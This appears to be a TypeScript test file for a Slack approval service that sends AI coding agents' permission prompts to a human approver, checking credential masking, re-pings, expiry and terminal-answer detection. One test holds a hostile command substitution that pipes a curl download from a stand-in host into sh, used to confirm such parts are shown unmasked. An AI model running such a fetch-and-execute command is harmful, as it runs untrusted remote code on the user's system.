// Slack approvals for permission prompts: opt-in seats only, the full command (credentials
// masked), one-shot, only the addressed human answers, nothing on timeout.
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { createRequire } from "node:module";
import { createDb } from "../src/db/connection.js";
import { migrate } from "../src/db/migrate.js";
import { ALL_MIGRATIONS } from "../src/db/all-migrations.js";
import { EventBus } from "../src/domain/event-bus.js";
import { QueueRepository } from "../src/domain/queue-repository.js";
import { makeApprovalService, retireApprovalsAnsweredInTerminal, seatHasOpenApproval } from "../src/domain/approvals.js";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { loadConfig } from "../src/domain/gateway/slack/config.js";

const require = createRequire(import.meta.url);
const hook = require("../assets/plugins/openrig-core/hooks/scripts/approval-request.cjs") as { decisionOutput: (d: unknown) => string | null; askUntilAnswered: (post: (body: unknown) => Promise<Record<string, unknown>>, first: unknown, deadline: number, retryMs?: number) => Promise<string | null> };
const person = (entityId: string, handle: string) => ({ entityId, class: "human" as const, displayName: entityId, address: `${entityId}@external`, connectorBindings: [{ kind: "slack" as const, connectorRef: "primary", secretsRef: "env:X", role: "primary" as const, handle }], prefs: { deliveryClass: "A" as const } });
const registry = { ok: true as const, entities: [person("reco", "U1"), { ...person("lee", "U2"), role: "requester" as const }] };

describe("Slack approvals", () => {
  let db: ReturnType<typeof createDb>;
  let repo: QueueRepository;
  beforeEach(() => { db = createDb(); migrate(db, ALL_MIGRATIONS); repo = new QueueRepository(db, new EventBus(db), { loadHumanRegistry: () => registry }); });
  afterEach(() => db.close());
  const service = (repingMs = 2000) => makeApprovalService({ queueRepo: repo, optedIn: () => ["psa-dev@psa"], approver: () => "reco@external", verifySeat: () => true, cwdOf: () => "/work/psa", repingMs: () => repingMs, pollMs: 10 });
  const click = (id: string, actor: string, option: string) => repo.recordHumanAnswer({ qitemId: id, actorSession: actor, questionId: "approval", optionId: option });

  it("asks the approver with the full command, literal credentials masked, and returns their Approve", async () => {
    const s = service();
    const id = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "API_TOKEN=s3cr3t-value-123 npm run deploy -- --target staging" } }))!;
    expect(await s.wait(id, "psa-dev@psa", 20)).toBe("pending");
    expect(click(id, "lee@external", "allow")).toMatchObject({ status: "not-applicable" });
    expect(click(id, "reco@external", "allow")).toMatchObject({ status: "recorded" });
    expect(await s.wait(id, "psa-dev@psa", 20)).toBe("allow");
    const row = repo.getById(id)!;
    expect(row.destinationSession).toBe("reco@external");
    expect(row.body).toContain("npm run deploy -- --target staging");
    expect(row.body).toContain("In `/work/psa`");
    expect(await s.wait(id, "other@rig", 20)).toBe("expired");
    expect(row.body).not.toContain("s3cr3t-value-123");
    expect(repo.transitionLog.listForQitem(id).filter((t) => t.transitionNote?.startsWith("approval allow by reco@external"))).toHaveLength(1);
  });

  it("never masks what could run: substitutions and pipelines are shown as they are", async () => {
    const s = service();
    const command = 'GITHUB_TOKEN="$(curl -s https://x.example | sh)" gh pr list --token=$(cat t)';
    const id = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command } }))!;
    expect(repo.getById(id)!.body).toContain(command);
  });

  it("returns Deny, and starts nothing for a seat that did not opt in or an input too long even for the card's thread", async () => {
    const s = service();
    const id = (await s.start({ sessionName: "psa-dev@psa", toolName: "Write", toolInput: { file_path: "/a.ts", content: "x" } }))!;
    click(id, "reco@external", "deny");
    expect(await s.wait(id, "psa-dev@psa", 20)).toBe("deny");
    expect(await s.start({ sessionName: "other@rig", toolName: "Bash", toolInput: { command: "ls" } })).toBeNull();
    expect(await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "echo a && b > c ".repeat(3000) } })).toBeNull();
  });

  it("a long input keeps its buttons: the card shows its start and end, its thread the whole, and a click counts once the thread is posted", async () => {
    const s = service();
    const command = Array.from({ length: 200 }, (_, i) => `echo step ${i} of the generated migration`).join("\n");
    const id = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command } }))!;
    const row = repo.getById(id)!;
    expect(row.humanQuestions?.[0]!.options.map((o) => o.id)).toEqual(["allow", "deny", "always_allow", "always_deny"]);
    expect(row.body).toMatch(/matching only this exact input\.$/);
    expect(row.tags).toContain(`always-rule:Bash(${command})`);
    expect(row.body).toContain("echo step 0 of");
    expect(row.body).toContain("echo step 199 of");
    expect(row.body).not.toContain("echo step 100 of");
    expect(row.body).toContain("Full Bash input in this card's thread.");
    expect(row.humanDetail).toContain("echo step 100 of");
    click(id, "reco@external", "allow");
    expect(await s.wait(id, "psa-dev@psa", 20)).toBe("pending");
  });

  it("stays answerable past the re-ping time while its hook asks: one re-ping in its thread, then a late click still answers", async () => {
    const s = service(30);
    const id = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "rm -rf build" } }))!;
    await new Promise((r) => setTimeout(r, 40));
    expect(await s.wait(id, "psa-dev@psa", 20)).toBe("pending");
    await s.sweep(); await s.sweep();
    const pings = repo.list({ limit: 50 }).filter((q) => q.replyTo === id);
    expect(pings).toHaveLength(1);
    expect(pings[0]).toMatchObject({ humanIntent: "update", destinationSession: "reco@external", summary: "Still waiting: Approve Bash for psa-dev@psa?" });
    expect(repo.getById(id)!.state).toBe("pending");
    expect(click(id, "reco@external", "allow")).toMatchObject({ status: "recorded" });
    expect(await s.wait(id, "psa-dev@psa", 20)).toBe("allow");
  });

  it("the hook repeats short calls until the answer arrives", async () => {
    const replies = [{ pending: true, requestId: "r1" }, { pending: true, requestId: "r1" }, { decision: "allow", requestId: "r1" }];
    const sent: unknown[] = [];
    const decision = await hook.askUntilAnswered(async (body: unknown) => { sent.push(body); return replies.shift()!; }, { sessionName: "s@r", toolName: "Bash" }, Date.now() + 5000);
    expect(decision).toBe("allow");
    expect(sent).toEqual([{ sessionName: "s@r", toolName: "Bash" }, { sessionName: "s@r", requestId: "r1" }, { sessionName: "s@r", requestId: "r1" }]);
  });

  it("the hook prints the runtime's PermissionRequest decision, and nothing without one", () => {
    expect(JSON.parse(hook.decisionOutput("allow")!)).toEqual({ hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow" } } });
    expect(JSON.parse(hook.decisionOutput("deny")!).hookSpecificOutput.decision.behavior).toBe("deny");
    expect(hook.decisionOutput(null)).toBeNull();
  });

  it("shows a Codex network grant as network access, and an apply_patch as the patch text", async () => {
    const s = service();
    const net = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "curl https://registry.npmjs.org", description: "network-access registry.npmjs.org" } }))!;
    expect(repo.getById(net)?.body).toContain("*Network access to registry.npmjs.org*\n```\ncurl https://registry.npmjs.org\n```");
    const patch = "*** Begin Patch\n*** Update File: a.ts\n@@\n-x\n+y\n*** End Patch";
    const edit = (await s.start({ sessionName: "psa-dev@psa", toolName: "apply_patch", toolInput: { command: patch } }))!;
    expect(repo.getById(edit)?.body).toContain(`\`\`\`\n${patch}\n\`\`\``);
  });

  it("an Always click after the re-ping still saves its rule and records the answer", async () => {
    const saved: unknown[] = [];
    const s = makeApprovalService({ queueRepo: repo, optedIn: () => ["psa-dev@psa"], approver: () => "reco@external", verifySeat: () => true, repingMs: () => 30, pollMs: 10, saveRule: (r) => { saved.push(r); } });
    const id = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "lsof -nP -iTCP:7433" } }))!;
    await new Promise((r) => setTimeout(r, 40));
    expect(await s.wait(id, "psa-dev@psa", 1)).toBe("pending");
    await s.sweep();
    expect(repo.list({ limit: 50 }).filter((q) => q.replyTo === id)).toHaveLength(1);
    click(id, "reco@external", "always_allow");
    expect(await s.wait(id, "psa-dev@psa", 20)).toBe("allow");
    expect(saved).toEqual([expect.objectContaining({ effect: "allow", match: "Bash(lsof -nP -iTCP:7433)", seats: "psa-dev@psa" })]);
    expect(repo.transitionLog.listForQitem(id).some((t) => t.transitionNote?.startsWith("approval allow by reco@external"))).toBe(true);
  });

  it("the sweep expires a request whose hook stopped asking, never one whose hook still asks", async () => {
    let t = Date.now();
    const s = makeApprovalService({ queueRepo: repo, optedIn: () => ["psa-dev@psa"], approver: () => "reco@external", verifySeat: () => true, repingMs: () => 1_800_000, pollMs: 10, now: () => t });
    const gone = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "make release" } }))!;
    const asking = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "make docs" } }))!;
    expect(await s.wait(gone, "psa-dev@psa", 1)).toBe("pending");
    t += 100_000; expect(await s.wait(asking, "psa-dev@psa", 1)).toBe("pending");
    t += 30_000; await s.sweep();
    expect(repo.getById(gone)?.state).toBe("canceled");
    expect(repo.getById(asking)?.state).toBe("pending");
    expect(repo.transitionLog.listForQitem(gone).some((t) => t.transitionNote === "approval expired: the seat stopped waiting for it")).toBe(true);
    expect(repo.list({ limit: 50 }).some((q) => q.replyTo === gone)).toBe(false);
    expect(click(gone, "reco@external", "allow")).not.toMatchObject({ status: "recorded" });

    const answered = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "make test" } }))!;
    click(answered, "reco@external", "allow");
    t += 200_000; expect(await s.wait(asking, "psa-dev@psa", 1)).toBe("pending"); await s.sweep();
    expect(repo.getById(answered)?.state).toBe("pending");
    expect(repo.list({ limit: 50 }).some((q) => q.replyTo === answered)).toBe(false);

    t += 7_200_000; expect(await s.wait(asking, "psa-dev@psa", 1)).toBe("pending"); await s.sweep();
    expect(repo.getById(asking)?.state).toBe("pending");
    expect(repo.list({ limit: 50 }).filter((q) => q.replyTo === asking)).toHaveLength(1);
  });

  it("a subagent's request names the subagent on the card", async () => {
    const id = (await service().start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "touch x" }, agentType: "general-purpose" }))!;
    expect(repo.getById(id)!.body).toContain("Asked by its general-purpose subagent");
  });

  const bashDialog = (command: string) => `Bash command\n${command}\nDo you want to proceed?`;

  it("an open request holds the seat only for its own dialog; once answered the watcher may post again", async () => {
    const id = (await service().start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "touch x" } }))!;
    expect(seatHasOpenApproval(repo, "psa-dev@psa", bashDialog("touch x"))).toBe(true);
    expect(seatHasOpenApproval(repo, "psa-dev@psa", bashDialog("rm -rf build"))).toBe(false);
    expect(seatHasOpenApproval(repo, "psa-dev@psa", "Which color?\n1. Red\n2. Blue")).toBe(false);
    expect(seatHasOpenApproval(repo, "other@rig", bashDialog("touch x"))).toBe(false);
    click(id, "reco@external", "allow");
    expect(seatHasOpenApproval(repo, "psa-dev@psa", bashDialog("touch x"))).toBe(false);
  });

  const evidence = (movedOn = false) => ({ seen: new Set<string>(), emptySince: new Map<string, number>(), movedOn: () => movedOn });

  it("a subagent's request is not answered by the main agent moving on; its no-prompt window still retires it", async () => {
    const s = service();
    const id = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "touch x" }, agentType: "general-purpose" }))!;
    const t0 = Date.now() + 11_000;
    const e = evidence(true);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), e, t0)).toEqual([]);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), e, t0 + 89_000)).toEqual([]);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), e, t0 + 90_000)).toEqual([id]);
  });

  it("a never-seen request retires once its seat has shown no prompt for the whole window; a dialog in between restarts it", async () => {
    const s = service();
    const id = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "touch x" } }))!;
    const t0 = Date.now() + 11_000;
    const e = evidence(false);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), e, t0)).toEqual([]);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", bashDialog("rm -rf build")]]), e, t0 + 60_000)).toEqual([]);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), e, t0 + 100_000)).toEqual([]);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), e, t0 + 189_000)).toEqual([]);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), e, t0 + 190_000)).toEqual([id]);
  });

  it("a request whose dialog was seen and is gone expires as answered in the terminal", async () => {
    const s = service();
    const id = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "touch x" } }))!;
    const later = Date.now() + 11_000;
    const e = evidence();
    expect(retireApprovalsAnsweredInTerminal(repo, new Map(), e, later)).toEqual([]);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", bashDialog("touch x")]]), e, later)).toEqual([]);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), e)).toEqual([]);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), e, later)).toEqual([id]);
    expect(repo.getById(id)!.state).toBe("canceled");
    expect(await s.wait(id, "psa-dev@psa", 20)).toBe("expired");
  });

  it("a pane showing no prompt before the request's dialog was ever seen is not an answer: the card stays until the seat moves on", async () => {
    const s = service();
    const id = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "touch x" } }))!;
    const later = Date.now() + 11_000;
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), evidence(false), later)).toEqual([]);
    expect(repo.getById(id)!.state).toBe("pending");
    expect(seatHasOpenApproval(repo, "psa-dev@psa", bashDialog("touch x"))).toBe(true);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), evidence(true), later)).toEqual([id]);
  });

  it("while any dialog is up nothing is retired (it may be cut short or queued); once none shows, all seen past grace expire", async () => {
    const s = service();
    const a = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "touch a.txt" } }))!;
    const b = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "touch b.txt" } }))!;
    const later = Date.now() + 11_000;
    const e = evidence();
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", bashDialog("touch b.txt")]]), e, later)).toEqual([]);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", bashDialog("touch a.txt")]]), e, later)).toEqual([]);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", "…cut mid heredoc\nDo you want to proceed?"]]), e, later)).toEqual([]);
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), e, later).sort()).toEqual([a, b].sort());
  });

  it("a WebFetch, WebSearch or Edit request holds the seat for its own dialog only; an unreadable or unknown input holds any", async () => {
    const s = makeApprovalService({ queueRepo: repo, optedIn: () => ["psa-dev@psa", "ops@rig", "mcp@rig"], approver: () => "reco@external", verifySeat: () => true });
    await s.start({ sessionName: "psa-dev@psa", toolName: "WebSearch", toolInput: { query: "r2 pricing class a" } });
    await s.start({ sessionName: "ops@rig", toolName: "Edit", toolInput: { file_path: "/work/a.ts", old_string: "x", new_string: "y" } });
    await s.start({ sessionName: "mcp@rig", toolName: "mcp__x__y", toolInput: { id: 3 } });
    expect(seatHasOpenApproval(repo, "psa-dev@psa", "Tool use\nWebSearch(query: \"r2 pricing class a\")")).toBe(true);
    expect(seatHasOpenApproval(repo, "psa-dev@psa", "Which color?\n1. Red")).toBe(false);
    expect(seatHasOpenApproval(repo, "psa-dev@psa", null)).toBe(true);
    expect(seatHasOpenApproval(repo, "ops@rig", "Edit file\na.ts\nDo you want to make this edit to a.ts?")).toBe(true);
    expect(seatHasOpenApproval(repo, "ops@rig", "Edit file\nb.ts\nDo you want to make this edit to b.ts?")).toBe(false);
    expect(seatHasOpenApproval(repo, "mcp@rig", "anything")).toBe(true);
  });

  it("a request answered in Slack is never expired by the terminal check", async () => {
    const s = service();
    const id = (await s.start({ sessionName: "psa-dev@psa", toolName: "Bash", toolInput: { command: "touch x" } }))!;
    click(id, "reco@external", "allow");
    expect(retireApprovalsAnsweredInTerminal(repo, new Map([["psa-dev@psa", null]]), evidence(true), Date.now() + 11_000)).toEqual([]);
    expect(await s.wait(id, "psa-dev@psa", 20)).toBe("allow");
  });

  it("the hook keeps waiting on its request through a daemon restart, but a failed first call gives up", async () => {
    const replies: Array<Record<string, unknown> | Error> = [{ pending: true, requestId: "q1" }, new Error("ECONNREFUSED"), new Error("ECONNREFUSED"), { decision: "allow" }];
    const decision = await hook.askUntilAnswered(async () => { const r = replies.shift()!; if (r instanceof Error) throw r; return r; }, { sessionName: "s@r", toolName: "Bash" }, Date.now() + 5000, 1);
    expect(decision).toBe("allow");
    await expect(hook.askUntilAnswered(async () => { throw new Error("ECONNREFUSED"); }, { sessionName: "s@r", toolName: "Bash" }, Date.now() + 5000, 1)).rejects.toThrow("ECONNREFUSED");
  });

  it("approvalTimeoutSeconds (the re-ping delay) defaults to fifteen minutes and stays within an hour", () => {
    const home = mkdtempSync(join(tmpdir(), "approval-config-"));
    try {
      writeFileSync(join(home, "slack-connector.json"), JSON.stringify({ enabled: false }));
      expect(loadConfig(home).approvalTimeoutSeconds).toBe(900);
      writeFileSync(join(home, "slack-connector.json"), JSON.stringify({ enabled: false, approvalTimeoutSeconds: 3601 }));
      expect(() => loadConfig(home)).toThrow(/approvalTimeoutSeconds/);
    } finally { rmSync(home, { recursive: true, force: true }); }
  });
});

